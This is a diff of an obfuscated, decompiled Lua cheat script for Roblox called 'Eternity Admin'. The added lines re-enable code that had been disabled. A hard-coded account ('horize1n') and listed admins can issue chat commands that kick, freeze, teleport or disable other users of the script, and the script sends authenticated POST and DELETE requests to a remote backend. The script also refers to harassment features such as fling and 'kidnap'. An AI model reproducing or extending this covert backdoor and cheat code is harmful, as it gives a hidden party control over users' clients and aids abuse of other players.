+						local n204 = nil
+						local iterFn12 = L1.iterFn1
+
 						function executeRemoteKick(str3)
-							-- Remote kick execution disabled
+							n204 = 1059150275
+
+							if str3 and str3 ~= "" then
+								local str4 = string.gsub(string.gsub(str3, "\"", ""), "'", "")
+								local str5 = string.gsub(str4, "^%s+", ""):gsub("%s+$", "")
+								local str6 = str
+								local apikey2 = apikey
+								local syn_ = syn
+
+								if syn_ then
+									syn_ = syn.request
+								end
+
+								if not syn_ then
+									syn_ = http
+
+									if syn_ then
+										syn_ = http.request
+									end
+								end
+
+								syn_ = syn_ or http_request or request
+								local HttpService = game:GetService("HttpService")
+								local str7 = string.lower(str5)
+
+								task.spawn(function()
+									local count3 = 30641806
+									local name4 = nil
+									local player = nil
+
+									for _, player2 in ipairs(L1.Players_:GetPlayers()) do
+										if player2 == L1.Players_.LocalPlayer then
+											continue
+										end
+
+										local str8 = string.lower(player2.Name)
+										local str9 = string.lower(player2.DisplayName)
+
+										if str8 == str7 or str9 == str7 or string.find(str8, str7, 1, true) or string.find(str9, str7, 1, true) then
+											name4 = player2.Name
+											player = player2
+											break
+										end
+									end
+
+									if not name4 then
+										pcall(function()
+											local url = ""
+											local body = nil
+
+											if type(syn_) == "function" then
+												local v6 = syn_({
+													Url = url,
+													Method = "GET",
+													Headers = { apikey = apikey2 },
+												})
+
+												if v6 and v6.Body and #v6.Body > 5 then
+													body = v6.Body
+												end
+											elseif safeHttpGet then
+												body = safeHttpGet(url)
+											end
+
+											if body and #body > 5 then
+												local ok, data = pcall(function()
+													return HttpService:JSONDecode(body)
+												end)
+
+												if ok and type(data) == "table" then
+													local v6, v7, v8 = ipairs(data)
+													local callback = (function(...) local f, s, c = ... return coroutine.wrap(function() for k, v9, v32, v42, v52, v62, v72, v82 in f, s, c do coroutine.yield(true, k, v9, v32, v42, v52, v62, v72, v82) end end) end)(v6, v7, v8)
+													local str9
+													local packed
+
+													while true do
+														packed = table.pack(callback())
+
+														if not packed[1] then
+															return
+														end
+
+														local v9 = packed[3]
+														local username = type(v9) == "table"
+
+														if username then
+															username = v9.username
+														end
+
+														username = username or tostring(v9)
+														str9 = string.gsub(string.gsub(username, "%%5F", "_"), "%s5F", "_")
+														local str10 = string.lower(str9)
+														if str10 == str7 or string.find(str10, str7, 1, true) then
+															break
+														end
+													end
+
+													name4 = str9
+												end
+											end
+										end)
+
+										name4 = name4 or str5
+									end
+
+									local str8 = string.lower(name4)
+									SendNotification("Eternity Admin", "Dispatching kick for: " .. name4, 3)
+
+									pcall(function()
+										local json = HttpService:JSONEncode({
+											username = name4,
+											reason = "Kicked by Eternity Admin (horize1n)",
+											kickedAt = os.time() * 1000,
+											kickedBy = "horize1n",
+										})
+
+										if type(syn_) == "function" then
+											syn_({
+												Url = str6 .. "/rest/v1/stats",
+												Method = "POST",
+												Headers = {
+													apikey = apikey2,
+													Authorization = "Bearer " .. apikey2,
+													["Content-Type"] = "application/json",
+													Prefer = "resolution=merge-duplicates",
+												},
+												Body = HttpService:JSONEncode({ key = "eternity:kick:" .. str8, value = json }),
+											})
+
+											syn_({
+												Url = str6 .. "/rest/v1/live_users?username=ilike." .. str8,
+												Method = "DELETE",
+												Headers = {
+													apikey = apikey2,
+													Authorization = "Bearer " .. apikey2,
+												},
+											})
+
+											syn_({
+												Url = str6 .. "/rest/v1/stats?key=eq.eternity:activity:" .. str8,
+												Method = "DELETE",
+												Headers = {
+													apikey = apikey2,
+													Authorization = "Bearer " .. apikey2,
+												},
+											})
+										end
+
+										if count3 < n204 then
+											return
+										end
+									end)
+
+									if n204 == 1059150275 then
+										if player and player.Kick then
+											pcall(function()
+												player:Kick("You have been kicked by an Eternity Admin.")
+												return
+											end)
+										end
+
+										if globalWebSocket and iterFn12 then
+											pcall(function()
+												iterFn12(globalWebSocket, {
+													event = "client-message",
+													channel = "global",
+													data = {
+														sender = "horize1n",
+														username = "horize1n",
+														text = ".kick " .. name4,
+														target = name4,
+													},
+												})
+
+												return
+
+
+											end)
+										end
+
+										if removeOnlineUserAvatar then
+											pcall(function()
+												removeOnlineUserAvatar(nil, nil, name4)
+												return
+											end)
+										end
+
+										SendNotification("Eternity Admin", "Successfully kicked " .. name4 .. " by Admin!", 5)
+										return
+									end
+								end)
+
+								return
+							end
 						end
 					end
 				end
@@ -75397,36 +69052,340 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 						getgenv().executeRemoteKick = executeRemoteKick
 					end)
 
-					task.spawn(function()
-						-- Remote kick listener disabled
-					end)
+				end
 
 					do
+						local n204 = nil
+						local n205 = nil
+
 						function processAdminCommand(player, str3)
-							-- Admin commands removed
+							n204 = 282349457
+							n205 = 850609727
+
+							if player and player.Name then
+								local str4 = string.lower(player.Name)
+								if not P2PAdmins[str4] and str4 ~= "horize1n" then
+									return
+								end
+								local str5 = string.lower(str3)
+
+								if string.sub(str5, 1, 1) == "." then
+									local match, part = str3:match("^(%.%w+)%s+[\"']?([^\"']+)[\"']?")
+									local str6
+
+									if not match then
+										local parts = string.split(str3, " ")
+										str6 = string.lower(parts[1] or "")
+										part = parts[2]
+									else
+										str6 = string.lower(match)
+									end
+
+									if part and part ~= "" then
+										local str7 = string.gsub(string.gsub(part, "\"", ""), "'", "")
+										local str8 = string.gsub(str7, "^%s+", ""):gsub("%s+$", "")
+										if (player == L1.Players_.LocalPlayer or str4 == "horize1n") and str6 == ".kick" then
+											executeRemoteKick(str8)
+											return
+										end
+										local str9 = string.lower(L1.Players_.LocalPlayer.DisplayName)
+										local str10 = string.lower(L1.Players_.LocalPlayer.Name)
+										local flag8 = false
+
+										if str8 == "all" then
+											flag8 = true
+										elseif str8 == "others" and L1.Players_.LocalPlayer.Name ~= player.Name then
+											flag8 = true
+										elseif str8 == "me" and L1.Players_.LocalPlayer.Name == player.Name then
+											flag8 = true
+										elseif (string.find(str9, str8, 1, true) or string.find(str10, str8, 1, true)) and L1.Players_.LocalPlayer.Name ~= player.Name then
+											flag8 = true
+										end
+
+										if flag8 then
+											local character2 = L1.Players_.LocalPlayer.Character
+											local humanoidRootPart2 = character2
+
+											if humanoidRootPart2 then
+												humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
+											end
+
+											local function fn16()
+												for _, v6 in ipairs({
+													"Facebang",
+													"Hipbang",
+													"Pat",
+													"Headsit",
+													"Backhug",
+													"Propose",
+													"Fronthug",
+													"Bagpack",
+													"Goon",
+													"Kidnap",
+													"Follow",
+													"Orbit",
+													"Fling",
+													"LethalFling",
+													"Spinbot",
+													"GlitchMove",
+													"SupermanFly",
+													"SkyDestroyer",
+													"ExtremeGlitchDesync",
+													"NormalGlitchDesync",
+												}) do
+													if n205 < step then
+														if (tbl[v6] == true or tbl9[v6] == true) and ToggleRegistry[v6] then
+															pcall(function()
+																ToggleRegistry[v6](false)
+																if n204 == 282349457 then
+																	return
+																end
+															end)
+														elseif (tbl[v6 .. "Enabled"] == true or tbl9[v6 .. "Enabled"] == true) and ToggleRegistry[v6 .. "Enabled"] then
+															pcall(function()
+																ToggleRegistry[v6 .. "Enabled"](false)
+															end)
+														end
+
+														continue
+													end
+
+													n204 -= 790
+													L1.step4 = 471511737
+													L1.step2 = 459247637
+													L1.step3 = 205083073
+													step = 20568686
+													n205 = 683557474
+
+													getfenv()[463525357] = 587
+												end
+											end
+
+											local function fn17()
+												for _, v6 in ipairs(AttachFeatures) do
+													if tbl[v6] then
+														pcall(function()
+															SetAttachState(v6, false)
+														end)
+													end
+
+													if GridButtonVisuals[v6] then
+														pcall(function()
+															GridButtonVisuals[v6](false)
+														end)
+													end
+												end
+
+												FacebangTarget = nil
+												HipbangTarget = nil
+												PatTarget = nil
+												HeadsitTarget = nil
+												BackhugTarget = nil
+
+												FronthugTarget = nil
+												ProposeTarget = nil
+												BagpackTarget = nil
+												GoonTarget = nil
+											end
+
+											if str6 == ".kick" then
+												pcall(function()
+													SendNotification("Eternity Admin", "You have been kicked by an admin.", 2)
+
+													if n204 == 282349514 then
+														L1.step2 = 173126931
+														L1.step3 += 1702
+														n205 = 885409266
+														n204 = 579639296
+														step -= 2047
+														L1.step4 = 891318527
+													end
+												end)
+
+												task.delay(0.15, function()
+													pcall(function()
+														L1.Players_.LocalPlayer:Kick("You have been kicked by an Eternity Admin.")
+													end)
+
+													pcall(function()
+														local localPlayer_2 = L1.Players_
+
+														if localPlayer_2 then
+															localPlayer_2 = L1.Players_.LocalPlayer
+														end
+
+														if not localPlayer_2 then
+															localPlayer_2 = game:GetService("Players")
+
+															if localPlayer_2 then
+																localPlayer_2 = game:GetService("Players").LocalPlayer
+															end
+														end
+
+														if localPlayer_2 then
+															localPlayer_2:Kick("You have been kicked by an Eternity Admin.")
+														end
+													end)
+
+													return
+												end)
+											elseif str6 == ".freeze" then
+												tbl.AdminFrozen = true
+												fn16()
+												fn17()
+
+												pcall(function()
+													if removeClickTeleportTool then
+														removeClickTeleportTool()
+													end
+
+													if n205 == 850610213 then
+													end
+												end)
+
+												if humanoidRootPart2 then
+													humanoidRootPart2.Anchored = true
+												end
+
+												SendNotification("Eternity Admin", "You have been frozen by an admin.", 3)
+											elseif str6 == ".unfreeze" or str6 == ".thaw" then
+												tbl.AdminFrozen = false
+
+												if humanoidRootPart2 then
+													humanoidRootPart2.Anchored = false
+												end
+
+												pcall(function()
+													if tbl.ClickTeleportTool and giveClickTeleportTool then
+														giveClickTeleportTool()
+													end
+												end)
+
+												SendNotification("Eternity Admin", "You have been unfrozen.", 3)
+											elseif str6 == ".bring" then
+												fn16()
+												fn17()
+												local character3 = player.Character
+
+												if not character3 then
+													character3 = player.Name
+
+													if character3 then
+														character3 = L1.Players_:FindFirstChild(player.Name)
+													end
+
+													if character3 then
+														character3 = L1.Players_:FindFirstChild(player.Name).Character
+													end
+												end
+
+												local humanoidRootPart3 = character3
+
+												if humanoidRootPart3 then
+													humanoidRootPart3 = character3:FindFirstChild("HumanoidRootPart")
+												end
+
+												if humanoidRootPart2 and humanoidRootPart3 then
+													humanoidRootPart2.CFrame = humanoidRootPart3.CFrame * CFrame.new(0, 0, -3)
+													SendNotification("Eternity Admin", "You have been brought by an admin.", 3)
+												else
+													SendNotification("Eternity Admin", "Admin brought you (cross-server: teleport only works in same game).", 4)
+												end
+											elseif str6 == ".disable" then
+												tbl.AdminDisabled = true
+												tbl.AttachLockedDisabled = true
+												fn16()
+												fn17()
+
+												pcall(function()
+													if removeClickTeleportTool then
+														removeClickTeleportTool()
+													end
+												end)
+
+												for k, v6 in pairs(ToggleRegistry) do
+													if tbl[k] == true or tbl9[k] == true then
+														pcall(function()
+															v6(false)
+															return
+														end)
+													end
+												end
+
+												SendNotification("Eternity Admin", "Your features and attachs have been disabled by an admin.", 5)
+											elseif str6 == ".undisable" then
+												tbl.AdminDisabled = false
+												tbl.AttachLockedDisabled = false
+												SendNotification("Eternity Admin", "Your features have been re-enabled by an admin.", 5)
+											end
+										end
+
+										return
+									end
+
+									return
+								end
+
+								return
+							end
 						end
 					end
-				end
 
 				getgenv().processAdminCommand = processAdminCommand
 				getgenv().P2PAdmins = P2PAdmins
 
 				do
 					function onPlayerAddedForAdmin(arg)
-						-- Remote player admin listener disabled
+						local count = 1048528269
+
+						if L1.step3 < count then
+							arg.Chatted:Connect(function(message)
+								processAdminCommand(arg, message)
+								if L1.step3 == 921533470 then
+									return
+								end
+							end)
+
+							return
+						end
 					end
 				end
 
-				nextBlock = 362
+				spill_2.r13, L1.iterFn1, L1.iterState1 = pairs(L1.Players_:GetPlayers())
+				nextBlock = 357
 			elseif nextBlock == 357 then
-				nextBlock = 362
+				L1.iterState1, spill_2.r21_1 = spill_2.r13(L1.iterFn1, L1.iterState1)
+
+				if L1.iterState1 == nil then
+					nextBlock = 360
+				else
+					nextBlock = 358
+				end
 			elseif nextBlock == 358 then
-				nextBlock = 362
+				L1.iterState1 = L1.iterState1
+				nextBlock = 359
 			elseif nextBlock == 359 then
-				nextBlock = 362
+				onPlayerAddedForAdmin(spill_2.r21_1)
+				nextBlock = 357
 			elseif nextBlock == 360 then
-				nextBlock = 362
+				L1.Players_.PlayerAdded:Connect(onPlayerAddedForAdmin)
+
+				if L1.TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
+					nextBlock = 362
+				else
+					nextBlock = 361
+				end
 			elseif nextBlock == 361 then
+				L1.TextChatService.MessageReceived:Connect(function(arg)
+					if arg.TextSource then
+						local playerByUserId = L1.Players_:GetPlayerByUserId(arg.TextSource.UserId)
+
+						if playerByUserId then
+							processAdminCommand(playerByUserId, arg.Text)
+						end
+					end
+				end)
+
 				nextBlock = 362
 			elseif nextBlock == 362 then
 				do
@@ -76169,7 +70128,11 @@ Click any clip on the bottom timeline to inspect, crop frames, adjust speed, and
 				warn("[Eternity] Access denied. You are not whitelisted.")
 				return
 			elseif nextBlock == 375 then
-				nextBlock = 27
+				pcall(function()
+					L1.players:Kick("You are blacklisted from using Eternity.")
+				end)
+
+				return
 			elseif nextBlock == 376 then
 				return
 			elseif nextBlock == 377 then
